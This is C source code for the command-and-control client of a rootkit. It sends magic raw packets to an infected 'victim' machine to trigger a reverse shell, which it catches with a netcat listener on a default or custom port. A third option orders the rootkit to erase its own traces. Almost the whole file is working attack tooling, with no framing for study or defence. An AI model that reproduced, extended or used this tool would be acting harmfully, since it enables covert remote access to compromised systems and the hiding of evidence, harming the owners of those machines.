#include "companion.h"

#define KGRN  "\x1B[32m"
#define KYLW  "\x1B[33m"
#define KBLU  "\x1B[34m"
#define KMGN  "\x1B[35m"
#define KRED  "\x1B[31m" 
#define RESET "\x1B[0m"

void print_welcome_message(){
    printf("**********************EAT**************************\n");
    printf("***********************SLEEP******************************\n");
    printf("***************************2600***************************\n");
    printf("****************************REPEAT*************************\n");
}

void print_help_dialog(const char* arg){
    printf("\nUsage: %s OPTION [victim_IP] [local_Port]\n\n", arg);
    printf("Program OPTIONs\n");
    char* line = "-S";
    char* desc = "Get a remote shell to [victim_IP] from first local ip available";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-u";
    desc = "Get a remote shell to [victim_IP] from local private IP(198.168.* or 10.* or 172.*) with custom [local_Port]";
    printf("\t%-40s %-50s\n\n", line, desc);
    line = "-i";
    desc = "Delete any traces of rootkit on the [victim_IP]";
    printf("\t%-40s %-50s\n\n", line, desc);


}

void check_ip_address_format(char* address){
    char* buf[256];
    int s = inet_pton(AF_INET, address, buf);
    if(s<0){
        printf("["KYLW"WARN"RESET"]""Error checking IP validity\n");
    }else if(s==0){
        printf("["KYLW"WARN"RESET"]""The victim IP is probably not valid\n");
    }
}

char* getLocalIpAddress(){

    struct ifaddrs *addrs, *tmp;
    getifaddrs(&addrs);

    char* IPbuffer = NULL;

    for (tmp = addrs; tmp != NULL; tmp = tmp->ifa_next) {
        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
            char* currentIP = inet_ntoa(pAddr->sin_addr);
            printf("[" KBLU "INFO" RESET "]""Potential IP: %s\n", currentIP);

            IPbuffer = strdup(currentIP);
            printf("[" KBLU "INFO" RESET "]""Attacker IP selected: %s\n", IPbuffer);
            break;
        }
    }

    freeifaddrs(addrs);
    return IPbuffer;
}

char* getLocalIpAddress_filtered() {
    struct ifaddrs *addrs, *tmp;
    getifaddrs(&addrs);

    char* IPbuffer = NULL;

    for (tmp = addrs; tmp != NULL; tmp = tmp->ifa_next) {
        if (tmp->ifa_addr && tmp->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *pAddr = (struct sockaddr_in *)tmp->ifa_addr;
            char* currentIP = inet_ntoa(pAddr->sin_addr);
            printf("[" KBLU "INFO" RESET "]""Potential IP: %s\n", currentIP);


            if ((strncmp(currentIP, "10.", 3) == 0) ||
                (strncmp(currentIP, "172.", 4) == 0 && (atoi(currentIP + 4) >= 16 && atoi(currentIP + 4) <= 31)) ||
                (strncmp(currentIP, "192.168.", 8) == 0)) {
                IPbuffer = strdup(currentIP);
                printf("[" KBLU "INFO" RESET "]""Attacker IP selected: %s\n", IPbuffer);
                break; 
            }
        }
    }

    freeifaddrs(addrs);
    return IPbuffer;
}

void get_shell(char* argv){
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(2600, 2600, local_ip, argv, 2048, "2600_PAYLOAD_GET_REVERSE_SHELL");
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");

    pid_t pid;
    pid = fork();
    if(pid < 0){
        perror("["KRED"ERROR"RESET"]""Could not create another process");
	    return;
	}else if(pid==0){
        sleep(1);

        if(rawsocket_send(packet)<0){
            printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
        }else{
            printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
        }
        
    }else {

        char *cmd = "nc";
        char *argv[4];
        argv[0] = "nc";
        argv[1] = "-lvp";
        argv[2] = "1234";
        argv[3] = NULL;

        printf("["KBLU"INFO"RESET"]""Trying to get a shell...\n");
        if(execvp(cmd, argv)<0){
            perror("["KRED"ERROR"RESET"]""Error executing background listener");
            return;
        }
        printf("["KGRN"OK"RESET"]""Got a shell\n");
    }
    
    free(local_ip);
}


void get_shell_with_custom_port(char* dest_address, char* dest_port) {
    char* local_ip = getLocalIpAddress_filtered();
    printf("[" KBLU "INFO" RESET "]""Victim IP selected: %s\n", dest_address);
    check_ip_address_format(dest_address);
    

    char payload[strlen("CUSTOM_2600_PAYLOAD_GET_REVERSE_SHELL_") + strlen(dest_port) + 1];
    strcpy(payload, "CUSTOM_2600_PAYLOAD_GET_REVERSE_SHELL_");
    strcat(payload, dest_port);

    packet_t packet = build_standard_packet(2600, 2600, local_ip, dest_address, 2048, payload);
    printf("[" KBLU "INFO" RESET "]""Sending malicious packet to infected machine...\n");

    pid_t pid;
    pid = fork();
    if (pid < 0) {
        perror("[" KRED "ERROR" RESET "]""Could not create another process");
        return;
    } else if (pid == 0) {
        sleep(1);

        if (rawsocket_send(packet) < 0) {
            printf("[" KRED "ERROR" RESET "]""An error occurred. Is the machine up?\n");
        } else {
            printf("[" KGRN "OK" RESET "]""Payload %s successfully sent!\n", payload);
        }
    } else {

        char *cmd = "nc";
        char *argv[4];
        argv[0] = "nc";
        argv[1] = "-lvp";
        argv[2] = dest_port;
        argv[3] = NULL;

        printf("[" KBLU "INFO" RESET "]""Trying to get a shell...\n");
        if (execvp(cmd, argv) < 0) {
            perror("[" KRED "ERROR" RESET "]""Error executing background listener");
            return;
        }
        printf("[" KGRN "OK" RESET "]""Got a shell\n");
    }
    
    free(local_ip);
}


void no_trace(char* argv){
    printf("["KBLU"INFO"RESET"]""HELLOe...\n");
    char* local_ip = getLocalIpAddress();
    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
    check_ip_address_format(argv);
    packet_t packet = build_standard_packet(2600, 2600, local_ip, argv, 2048, "2600_KILL_ALL");
    printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");

    if(rawsocket_send(packet)<0){
        printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
    }else{
        printf("["KGRN"OK"RESET"]""Request to destruct all successfully sent!\n");
    }
    free(local_ip);
}


void main(int argc, char* argv[]){
    if(argc<2){
        printf("["KRED"ERROR"RESET"]""Invalid number of arguments\n");
        print_help_dialog(argv[0]);
        return;
    }

    
    int opt;
    char dest_address[32];
    char path_arg[512];
    char dest_port[16];


    while ((opt = getopt(argc, argv, ":S:u:i:")) != -1) {
        switch (opt) {
        case 'S':
            print_welcome_message();
            sleep(1);

            printf("["KBLU"INFO"RESET"]""Activated GET a SHELL mode\n");

            strcpy(dest_address, optarg);
            get_shell(dest_address);
            
            break;

        case 'u':
            if(argc<2){
               printf("["KRED"ERROR"RESET"]""Invalid number of arguments\n");
               printf("["KRED"ERROR"RESET"]""-Sp need IP and Port like len(1234)  \n");
               printf("["KRED"ERROR"RESET"]""get_shell_with_custom_port need 2 argc\n");
               return; 
            }
            print_welcome_message();
            sleep(1);

            printf("["KBLU"INFO"RESET"]""Activated GET a SHELL mode\n");
            strcpy(dest_address, optarg);

            if (optind < argc) {

                strcpy(dest_port, argv[optind]);

            }
            get_shell_with_custom_port(dest_address, dest_port);
            break;
        case 'i':
            print_welcome_message();
            sleep(1);
 
            printf("["KBLU"INFO"RESET"]""Activated SELF DESTRUCT\n");

            strcpy(dest_address, optarg);
            no_trace(dest_address);
            break;
        }
    }
}  